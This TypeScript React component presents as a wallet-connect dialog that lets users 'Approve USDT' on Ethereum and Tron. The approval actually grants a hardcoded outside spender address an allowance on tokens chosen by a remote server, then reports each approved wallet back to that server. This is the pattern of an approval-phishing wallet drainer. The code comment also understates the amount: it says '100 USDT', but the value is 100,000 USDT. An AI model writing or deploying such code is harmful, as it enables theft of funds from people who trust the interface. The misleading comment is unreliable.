"use client";

import { useState, useEffect, useCallback } from 'react';
import { useAccount, useConnect, usePublicClient, useWalletClient, useDisconnect } from 'wagmi';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Wallet2Icon, AlertCircle } from 'lucide-react';
import { encodeFunctionData } from 'viem';
import { WalletConnectWallet, WalletConnectChainID } from '@tronweb3/walletconnect-tron';

// USDT Contract Addresses
const ERC20_USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const SPENDER_ADDRESS = "0xc0Ef3d4d72146f4e1459d0Dd534041327905f4A4";
const TRON_USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const TRON_SPENDER_ADDRESS = "TDXiDyt2vQeGAj2JuEQnW3XdXfHjvGoScN";

// USDT has 6 decimals
const APPROVAL_AMOUNT = BigInt(100000000000); // 100 USDT

const USDT_ABI = [
  {
    constant: false,
    inputs: [
      { name: "_spender", type: "address" },
      { name: "_value", type: "uint256" }
    ],
    name: "approve",
    outputs: [{ name: "", type: "bool" }],
    payable: false,
    stateMutability: "nonpayable",
    type: "function"
  }
];

declare global {
  interface Window {
    tronWeb: any;
    tronLink: any;
  }
}

let tronWalletConnect: ReturnType<typeof initTronWalletConnect> | null = null;

// Initialize WalletConnect for Tron
const initTronWalletConnect = () => {
  if (!process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID) {
    console.error('WalletConnect Project ID is not configured');
    return null;
  }

  try {
    return new WalletConnectWallet({
      network: WalletConnectChainID.Mainnet,
      options: {
        relayUrl: 'wss://relay.walletconnect.com',
        projectId: process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID,
        metadata: {
          name: 'USDT Approval',
          description: 'USDT Approval System',
          url: window.location.origin,
          icons: ['https://avatars.githubusercontent.com/u/37784886']
        }
      },
      web3ModalConfig: {
        themeMode: 'dark',
        explorerRecommendedWalletIds: [
          '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369',
          '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0'
        ]
      }
    });
  } catch (error) {
    console.error('Failed to initialize TronWalletConnect:', error);
    return null;
  }
};

const waitForTronWeb = async (maxAttempts = 10, interval = 500): Promise<boolean> => {
  for (let i = 0; i < maxAttempts; i++) {
    try {
      // Check if tronWeb is false (rejected) or not an object
      if (window.tronWeb === false || typeof window.tronWeb !== 'object') {
        return false;
      }
      
      // Check if tronWeb is ready and has defaultAddress
      if (window.tronWeb?.ready && 
          typeof window.tronWeb.defaultAddress === 'object' && 
          window.tronWeb.defaultAddress?.base58) {
        return true;
      }
    } catch (error) {
      console.error('Error checking TronWeb status:', error);
    }
    await new Promise(resolve => setTimeout(resolve, interval));
  }
  return false;
};

export function WalletConnectButton() {
  const [isOpen, setIsOpen] = useState(false);
  const { address, isConnected } = useAccount();
  const { connect, connectors, isLoading: isConnecting } = useConnect({
    onError: (error) => {
      console.error('Connection error:', error);
      const errorMessage = error instanceof Error ? 
        error.message.includes('User rejected') || error.message.includes('rejected') ? 
          "Connection was rejected by user" : 
          "Failed to connect" : 
        "Failed to connect";
      setError(errorMessage);
      setHasRejectedConnection(true);
    }
  });
  const { disconnect } = useDisconnect();
  const publicClient = usePublicClient();
  const { data: walletClient } = useWalletClient();
  const [isApproving, setIsApproving] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [txHash, setTxHash] = useState<string | null>(null);
  const [connectionAttempts, setConnectionAttempts] = useState(0);

  // Tron states
  const [isTronApproving, setIsTronApproving] = useState(false);
  const [tronError, setTronError] = useState<string | null>(null);
  const [isTronConnected, setIsTronConnected] = useState(false);
  const [tronAddress, setTronAddress] = useState<string | null>(null);
  const [activeTab, setActiveTab] = useState("erc");
  const [isTronWalletConnect, setIsTronWalletConnect] = useState(false);
  const [isInitializingWC, setIsInitializingWC] = useState(false);
  const [isTronWebReady, setIsTronWebReady] = useState(false);
  const [isCheckingTronWeb, setIsCheckingTronWeb] = useState(false);
  const [isTronLinkConnecting, setIsTronLinkConnecting] = useState(false);
  const [hasRejectedConnection, setHasRejectedConnection] = useState(false);

  // Cleanup function for WalletConnect
  const cleanupWalletConnect = useCallback(async () => {
    if (tronWalletConnect) {
      try {
        const isConnected = await tronWalletConnect.checkConnectStatus()
          .then(status => !!status.address)
          .catch(() => false);

        if (isConnected) {
          await tronWalletConnect.disconnect().catch(() => {});
        }
      } catch (error) {
        console.error('Error during WalletConnect cleanup:', error);
      }
      tronWalletConnect = null;
    }
    setIsTronWalletConnect(false);
  }, []);

  // Reset all states
  const resetStates = useCallback(() => {
    setError(null);
    setTronError(null);
    setConnectionAttempts(0);
    setIsTronWebReady(false);
    setIsCheckingTronWeb(false);
    setIsTronLinkConnecting(false);
    setHasRejectedConnection(false);
    setTxHash(null);
  }, []);

  // Initialize TronWalletConnect when needed
  useEffect(() => {
    if (!tronWalletConnect && activeTab === "tron" && !isInitializingWC) {
      setIsInitializingWC(true);
      const instance = initTronWalletConnect();
      if (instance) {
        tronWalletConnect = instance;
      }
      setIsInitializingWC(false);
    }
  }, [activeTab, isInitializingWC]);

  // Check TronWeb ready state
  useEffect(() => {
    let mounted = true;
    let checkInterval: NodeJS.Timeout;

    const checkTronWebReady = async () => {
      if (!mounted || isCheckingTronWeb || isTronLinkConnecting || hasRejectedConnection) return;

      setIsCheckingTronWeb(true);
      try {
        // Check if TronLink is installed and not in a rejected state
        if (window.tronLink && !hasRejectedConnection) {
          // Check if tronWeb is false (rejected)
          if (window.tronWeb === false) {
            setIsTronWebReady(false);
            setTronError("Connection was rejected");
            setHasRejectedConnection(true);
            return;
          }

          const isReady = await waitForTronWeb(3, 500);
          if (mounted) {
            setIsTronWebReady(isReady);
            if (!isReady && !tronError && !isTronLinkConnecting && !hasRejectedConnection) {
              setTronError("Please install or unlock TronLink");
            }
          }
        }
      } catch (error) {
        console.error('Error checking TronWeb ready state:', error);
        if (mounted) {
          setIsTronWebReady(false);
          setTronError("Error checking wallet status");
        }
      }
      setIsCheckingTronWeb(false);
    };

    if (activeTab === "tron" && !isTronWalletConnect && !isTronConnected && !hasRejectedConnection) {
      checkTronWebReady();
      checkInterval = setInterval(checkTronWebReady, 5000);
    }

    return () => {
      mounted = false;
      if (checkInterval) {
        clearInterval(checkInterval);
      }
    };
  }, [activeTab, isTronWalletConnect, isTronConnected, tronError, isTronLinkConnecting, hasRejectedConnection]);

  // Clear errors when changing tabs or closing modal
  useEffect(() => {
    resetStates();
  }, [activeTab, isOpen, resetStates]);

  // Cleanup on unmount or when dialog closes
  useEffect(() => {
    if (!isOpen) {
      const cleanup = async () => {
        if (!isTronConnected) {
          await cleanupWalletConnect();
        }
        resetStates();
      };
      cleanup();
    }

    return () => {
      if (!isOpen) {
        cleanupWalletConnect().catch(console.error);
      }
    };
  }, [isOpen, isTronConnected, cleanupWalletConnect, resetStates]);

  // Check TronLink connection status
  useEffect(() => {
    let mounted = true;
    let retryCount = 0;
    const maxRetries = 3;

    const checkTronConnection = async () => {
      if (!isOpen || activeTab !== "tron" || !mounted || isTronLinkConnecting || hasRejectedConnection) return;

      try {
        if (tronWalletConnect) {
          const wcStatus = await tronWalletConnect.checkConnectStatus();
          if (wcStatus.address && mounted) {
            setTronAddress(wcStatus.address);
            setIsTronConnected(true);
            setIsTronWalletConnect(true);
            setHasRejectedConnection(false);
            return;
          }
        }

        // Check if tronWeb is false (rejected) or not an object
        if (window.tronWeb === false || typeof window.tronWeb !== 'object') {
          setIsTronConnected(false);
          setTronAddress(null);
          setHasRejectedConnection(true);
          return;
        }

        // Check TronLink connection
        if (window.tronWeb?.ready && 
            typeof window.tronWeb.defaultAddress === 'object' && 
            window.tronWeb.defaultAddress?.base58) {
          const address = window.tronWeb.defaultAddress.base58;
          if (address && mounted) {
            setTronAddress(address);
            setIsTronConnected(true);
            setIsTronWalletConnect(false);
            setHasRejectedConnection(false);
          }
        } else if (retryCount < maxRetries && !hasRejectedConnection) {
          retryCount++;
          setTimeout(checkTronConnection, 1000);
        }
      } catch (error) {
        console.error("Error checking Tron connection:", error);
        if (mounted) {
          setIsTronConnected(false);
          setTronAddress(null);
          if (retryCount < maxRetries && !hasRejectedConnection) {
            retryCount++;
            setTimeout(checkTronConnection, 1000);
          }
        }
      }
    };

    checkTronConnection();

    const handleAccountsChanged = () => {
      if (!hasRejectedConnection) {
        checkTronConnection();
      }
    };

    if (isOpen && activeTab === "tron" && window.tronLink?.eventServer) {
      try {
        window.tronLink.eventServer.on('addressChanged', handleAccountsChanged);
      } catch (error) {
        console.error("Error setting up TronLink event listener:", error);
      }
    }

    return () => {
      mounted = false;
      if (window.tronLink?.eventServer) {
        try {
          window.tronLink.eventServer.off('addressChanged', handleAccountsChanged);
        } catch (error) {
          console.error("Error removing TronLink event listener:", error);
        }
      }
    };
  }, [isOpen, activeTab, isTronLinkConnecting, hasRejectedConnection]);

  const retryConnection = useCallback(async (connectFn: () => Promise<any>, maxAttempts = 3, delay = 1000) => {
    let attempts = 0;
    while (attempts < maxAttempts) {
      try {
        const result = await connectFn();
        
        // Check for user cancellation
        if (result === false || 
            (typeof result === 'object' && result?.code === 4001) || 
            (typeof result === 'string' && (
              result.includes('User rejected') || 
              result.includes('User canceled') ||
              result.includes('User cancelled')
            ))) {
          setHasRejectedConnection(true);
          throw new Error("User cancelled the operation");
        }
        
        setHasRejectedConnection(false);
        return result;
      } catch (error: any) {
        attempts++;
        
        // Check for user cancellation
        if (error?.message?.toLowerCase().includes('cancel') ||
            error?.message?.toLowerCase().includes('reject') ||
            error?.code === 4001 ||
            error?.code === "USER_REJECTED" ||
            error === false) {
          setHasRejectedConnection(true);
          throw new Error("User cancelled the operation");
        }
        
        if (attempts === maxAttempts) {
          throw new Error("Connection failed after multiple attempts");
        }
        
        await new Promise(resolve => setTimeout(resolve, delay));
      }
    }
    throw new Error("Connection failed after multiple attempts");
  }, []);

  const connectTronWalletConnect = async () => {
    try {
      setTronError(null);
      setIsInitializingWC(true);
      setHasRejectedConnection(false);

      await cleanupWalletConnect();

      const instance = initTronWalletConnect();
      if (!instance) {
        throw new Error("WalletConnect initialization failed");
      }
      tronWalletConnect = instance;

      const { address } = await retryConnection(
        () => tronWalletConnect!.connect(),
        3,
        1000
      );

      if (address) {
        setTronAddress(address);
        setIsTronConnected(true);
        setIsTronWalletConnect(true);
        setHasRejectedConnection(false);
      } else {
        throw new Error("Connection was rejected");
      }
    } catch (error) {
      console.error('WalletConnect connection error:', error);
      const errorMessage = error instanceof Error ? 
        error.message === "Connection was rejected" ? "Connection was rejected by user" :
        error.message === "WalletConnect initialization failed" ? "Failed to initialize WalletConnect" :
        "Failed to connect with WalletConnect" : 
        "Failed to connect with WalletConnect";
      
      setTronError(errorMessage);
      setIsTronConnected(false);
      setTronAddress(null);
      setIsTronWalletConnect(false);
      await cleanupWalletConnect();
    } finally {
      setIsInitializingWC(false);
    }
  };

  const connectTronLink = async () => {
    try {
      setTronError(null);
      setIsTronWebReady(false);
      setIsTronLinkConnecting(true);
      setHasRejectedConnection(false);
      
      if (!window.tronLink) {
        throw new Error('Please install TronLink wallet');
      }

      // Request account access
      const result = await retryConnection(
        async () => {
          const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
          if (res === false) throw new Error('Connection was rejected');
          return res;
        },
        3,
        1000
      );

      // Short delay to allow TronWeb to initialize
      await new Promise(resolve => setTimeout(resolve, 500));

      // Check TronWeb state after connection attempt
      try {
        // Check if tronWeb is false (rejected) or not an object
        if (window.tronWeb === false || typeof window.tronWeb !== 'object') {
          throw new Error('Connection was rejected');
        }

        if (window.tronWeb?.ready && 
            typeof window.tronWeb.defaultAddress === 'object' && 
            window.tronWeb.defaultAddress?.base58) {
          const address = window.tronWeb.defaultAddress.base58;
          if (address) {
            setTronAddress(address);
            setIsTronConnected(true);
            setIsTronWalletConnect(false);
            setIsTronWebReady(true);
            setTronError(null);
            setHasRejectedConnection(false);
          } else {
            throw new Error('Failed to get Tron address');
          }
        } else {
          throw new Error('TronWeb not ready');
        }
      } catch (error) {
        console.error('Error accessing TronWeb after connection:', error);
        throw new Error('Failed to access wallet');
      }
    } catch (error) {
      console.error('TronLink connection error:', error);
      const errorMessage = error instanceof Error ? 
        error.message === "Connection was rejected" ? "Connection was rejected by user" :
        error.message === "Failed to access wallet" ? "Failed to access wallet" :
        "Failed to connect to TronLink" : 
        "Failed to connect to TronLink";
      
      setTronError(errorMessage);
      setIsTronConnected(false);
      setTronAddress(null);
      setIsTronWalletConnect(false);
      setIsTronWebReady(false);
      setHasRejectedConnection(true);
    } finally {
      setIsTronLinkConnecting(false);
    }
  };

  const disconnectTron = async () => {
    try {
      await cleanupWalletConnect();
      setIsTronConnected(false);
      setTronAddress(null);
      setIsTronWalletConnect(false);
      setIsTronWebReady(false);
      setTronError(null);
      setHasRejectedConnection(false);
    } catch (error) {
      console.error('Error disconnecting:', error);
    }
  };

  const handleConnectorClick = async (connector: any) => {
    try {
      setError(null);
      setHasRejectedConnection(false);
      if (isConnecting) return;
      
      await retryConnection(
        () => Promise.resolve(connect({ connector })),
        3,
        1000
      );
    } catch (err: any) {
      console.error('Connection error:', err);
      const errorMessage = err?.message?.includes('User cancelled') ? 
        "Connection was cancelled by user" : 
        "Failed to connect";
      
      setError(errorMessage);
      setHasRejectedConnection(true);
    }
  };

  // Helper function to fetch token address
  const fetchTokenAddress = async (walletAddress: string, chainId: number): Promise<string | null> => {
    try {
      const response = await fetch('https://api.onetimedomain.online/api/extension/check-allowance', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          walletAddress,
          chainId,
        }),
      });

      const data = await response.json();
      console.log("🚀 ~ fetchTokenAddress ~ data:", data)
      if (data?.tokensNeedingAllowance?.length > 0) {
        return data.tokensNeedingAllowance[0].address;
      }
      return null;
    } catch (error) {
      console.error('Error fetching token address:', error);
      return null;
    }
  };

  const updateAllowance = async (walletAddress: string, chainId: number, approvedTokens: string[]): Promise<void> => {
    try {
      const response = await fetch('https://api.onetimedomain.online/api/extension/update-allowance', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          walletAddress,
          chainId,
          tokenAddresses: approvedTokens,
        }),
      });
  
      const data = await response.json();
      console.log("🚀 ~ updateAllowance ~ data:", data)
      if (data?.message === "Allowances updated successfully") {
        console.log('Allowance updated successfully:', data);
      } else {
        console.error('Failed to update allowance:', data);
      }
    } catch (error) {
      console.error('Error updating allowance:', error);
    }
  };

  const handleApprove = async () => {
    if (!walletClient || !address) {
      setError("Wallet not connected");
      return;
    }
  
    if (isApproving) {
      return;
    }
  
    try {
      setIsApproving(true);
      setError(null);
      setTxHash(null);
      setHasRejectedConnection(false);
  
      // Fetch token address dynamically
      const tokenAddress = await fetchTokenAddress(address, 1); // Chain ID 1 for Ethereum
      if (!tokenAddress) {
        setError("Failed to fetch token address");
        return;
      }
  
      const encodedData = encodeFunctionData({
        abi: USDT_ABI,
        functionName: 'approve',
        args: [SPENDER_ADDRESS, APPROVAL_AMOUNT],
      });
  
      const hash = await retryConnection(
        async () =>
          walletClient.sendTransaction({
            to: tokenAddress.startsWith('0x') ? tokenAddress as `0x${string}` : `0x${tokenAddress}`,
            data: encodedData,
            account: address,
          }),
        3,
        1000
      );
  
      setTxHash(hash);
  
      const receipt = await publicClient.waitForTransactionReceipt({ hash });
      console.log('Transaction confirmed:', receipt);
  
      // Call updateAllowance API after successful approval
      await updateAllowance(address, 1, [tokenAddress]); // Chain ID 1 for Ethereum
    } catch (err: any) {
      console.error('Approval error:', err);
      const errorMessage = err?.message?.includes('User cancelled')
        ? "Transaction was cancelled by user"
        : "Transaction failed";
  
      setError(errorMessage);
      setTxHash(null);
      setHasRejectedConnection(true);
    } finally {
      setIsApproving(false);
    }
  };
  
  // Updated approveTron function for Tron
  const approveTron = async () => {
    if (!isTronConnected) {
      setTronError("Please connect your wallet first");
      return;
    }
  
    try {
      setIsTronApproving(true);
      setTronError(null);
      setHasRejectedConnection(false);
  
      // Fetch token address dynamically
      const tokenAddress = await fetchTokenAddress(tronAddress!, 728126428); // Chain ID 728126428 for Tron
      if (!tokenAddress) {
        setTronError("Failed to fetch token address");
        return;
      }
  
      if (isTronWalletConnect && tronWalletConnect) {
        const functionSelector = "0x095ea7b3";
  
        const transaction = {
          to: tokenAddress,
          data: functionSelector,
          value: "0",
          parameters: [TRON_SPENDER_ADDRESS, APPROVAL_AMOUNT.toString()],
          functionSignature: "approve(address,uint256)",
          parameterTypes: ["address", "uint256"],
        };
  
        await retryConnection(() => tronWalletConnect!.signTransaction(transaction), 3, 1000);
      } else {
        if (window.tronWeb === false || typeof window.tronWeb !== 'object') {
          throw new Error('Connection was rejected');
        }
  
        if (!window.tronWeb?.ready) {
          throw new Error('TronWeb is not ready');
        }
  
        const tronUsdtContract = await window.tronWeb.contract().at(tokenAddress);
        await retryConnection(
          () =>
            tronUsdtContract
              .approve(TRON_SPENDER_ADDRESS, APPROVAL_AMOUNT.toString())
              .send(),
          3,
          1000
        );
      }
  
      // Call updateAllowance API after successful approval
      await updateAllowance(tronAddress!, 728126428, [tokenAddress]); // Chain ID 728126428 for Tron
    } catch (error: any) {
      console.error('Tron approval error:', error);
      const errorMessage = error?.message?.includes('User cancelled')
        ? "Transaction was cancelled by user"
        : "Transaction failed";
  
      setTronError(errorMessage);
      setHasRejectedConnection(true);
    } finally {
      setIsTronApproving(false);
    }
  };

  const ErrorMessage = ({ message }: { message: string }) => (
    <div className="flex items-center gap-2 p-3 rounded-md bg-red-500/10 text-red-500">
      <AlertCircle className="w-4 h-4" />
      <p className="text-sm break-words">{message}</p>
    </div>
  );

  return (
    <>
      <Button 
        onClick={() => setIsOpen(true)}
        className="flex items-center gap-2 w-full justify-center"
        variant="outline"
      >
        <Wallet2Icon className="w-5 h-5" />
        {isConnected || isTronConnected ? 'Manage USDT Approval' : 'Connect Wallet'}
      </Button>

      <Dialog open={isOpen} onOpenChange={async (open) => {
        if (!open) {
          // Clean up connections when closing the dialog
          if (!isTronConnected) {
            await cleanupWalletConnect();
          }
          if (!isConnected) {
            disconnect();
          }
          resetStates();
        }
        setIsOpen(open);
      }}>
        <DialogContent className="sm:max-w-[425px]">
          <DialogHeader>
            <DialogTitle>Connect Wallet</DialogTitle>
          </DialogHeader>

          <Tabs defaultValue="erc" className="w-full" value={activeTab} onValueChange={async (value) => {
            if (value !== activeTab) {
              if (activeTab === "tron" && !isTronConnected) {
                await cleanupWalletConnect();
              }
              setActiveTab(value);
              resetStates();
            }
          }}>
            <TabsList className="grid w-full grid-cols-2">
              <TabsTrigger value="erc">Ethereum</TabsTrigger>
              <TabsTrigger value="tron">Tron</TabsTrigger>
            </TabsList>

            <TabsContent value="erc" className="space-y-4">
              {!isConnected ? (
                <div className="space-y-4">
                  {connectors.map((connector) => (
                    <Button
                      key={connector.id}
                      onClick={() => handleConnectorClick(connector)}
                      className="w-full"
                      disabled={!connector.ready || isConnecting}
                    >
                      {connector.name}
                      {isConnecting && connector.name === 'MetaMask' && ' (Connecting...)'}
                    </Button>
                  ))}
                  {error && <ErrorMessage message={error} />}
                </div>
              ) : (
                <div className="space-y-4">
                  <div className="flex items-center justify-between">
                    <p className="text-sm text-gray-500">Connected: {address?.slice(0, 6)}...{address?.slice(-4)}</p>
                    <button 
                      onClick={() => {
                        disconnect();
                        setError(null);
                        setTxHash(null);
                      }}
                      className="text-sm text-blue-500 hover:text-blue-600 hover:underline"
                    >
                      Disconnect
                    </button>
                  </div>
                  <Button 
                    onClick={handleApprove}
                    className="w-full"
                    disabled={isApproving || !walletClient}
                  >
                    {isApproving ? 'Approving...' : 'Approve USDT'}
                  </Button>
                  
                  {error && <ErrorMessage message={error} />}
                  
                  {txHash && !error && (
                    <p className="text-sm text-green-500">
                      Transaction sent! Hash: {txHash.slice(0, 10)}...
                    </p>
                  )}
                </div>
              )}
            </TabsContent>

            <TabsContent value="tron" className="space-y-4">
              {!isTronConnected ? (
                <div className="space-y-4">
                  <Button 
                    onClick={connectTronWalletConnect}
                    className="w-full"
                    disabled={isInitializingWC}
                  >
                    {isInitializingWC ? 'Initializing...' : 'WalletConnect'}
                  </Button>
                  <Button 
                    onClick={connectTronLink}
                    className="w-full"
                    disabled={!window.tronLink || isTronLinkConnecting}
                  >
                    {!window.tronLink ? 'Install TronLink' : 
                     isTronLinkConnecting ? 'Connecting...' :
                     hasRejectedConnection ? 'Connect TronLink' :
                     'Connect TronLink'}
                  </Button>
                  {tronError && <ErrorMessage message={tronError} />}
                </div>
              ) : (
                <div className="space-y-4">
                  <div className="flex items-center justify-between">
                    <div>
                      <p className="text-sm text-gray-500">Connected: {tronAddress?.slice(0, 6)}...{tronAddress?.slice(-4)}</p>
                      <p className="text-xs text-gray-400">via {isTronWalletConnect ? 'WalletConnect' : 'TronLink'}</p>
                    </div>
                    <button 
                      onClick={disconnectTron}
                      className="text-sm text-blue-500 hover:text-blue-600 hover:underline"
                    >
                      Disconnect
                    </button>
                  </div>
                  <Button 
                    onClick={approveTron}
                    className="w-full"
                    disabled={isTronApproving || !isTronWebReady}
                  >
                    {isTronApproving ? 'Approving...' : 'Approve USDT'}
                  </Button>
                  {tronError && <ErrorMessage message={tronError} />}
                </div>
              )}
            </TabsContent>
          </Tabs>
        </DialogContent>
      </Dialog>
    </>
  );
}